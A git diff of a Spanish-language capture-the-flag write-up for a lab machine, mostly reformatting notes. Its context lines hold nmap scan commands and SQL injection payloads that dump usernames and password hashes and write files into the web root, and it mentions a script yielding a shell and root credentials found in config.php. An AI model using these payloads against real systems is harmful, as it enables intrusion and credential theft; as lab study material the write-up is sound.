@@ -1,10 +1,11 @@
+#SQLi #Python
 ## Reconocimiento
 
 `nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.116 -oG allPorts`
 
 `nmap -p 22,80,4566,8080 -sCV -vvv 10.10.11.116 -oN targeted`
 
-```
+```js
 22/ssh
 80/http
 4566/http
@@ -26,14 +27,12 @@ Interceptamos la petición con Burpsuite, y vemos que en el campo de selección 
 
 `' union select group_concat(username,0x3a,userhash) from registration-- -` Obtener los valores de las columnas
 
-BBDD:
-`registration`
-Tables:
-`registration`
-Columns:
-`username` `userhash` `country` `regtime`
-Valores:
-Se nos muestran los valores de prueba que hemos generado nosotros anteriormente, y esos no nos valen
+
+| BBDD         | TABLES       | COLUMNS   | Valores                                                      |
+| ------------ | ------------ | --------- | ------------------------------------------------------------ |
+| registration | registration | usernames | Muestra los valores generados anterior mentes en las pruebas |
+|              |              | userhash  |                                                              |
+Esos valores no nos valen
 
 Validaremos si somos capacidades de depositar contenido en una ruta
 `' union select "probando" into outfile "/var/www/html/prueba.txt"-- -` somos capaces de poder depositar contenido en diversas rutas
@@ -97,4 +96,4 @@ shell.interactive()
 ```
 
 Este script nos generara una shell en nuestra propia maquina a la hora de ejecutarlo.
-Una vez accedido a la maquina en el directorio en el que nos encontramos 
+Una vez accedido a la maquina en el directorio en el que nos encontramos, encontramos un archivo `config.php` el cual contiene unas credenciales que corresponde a root
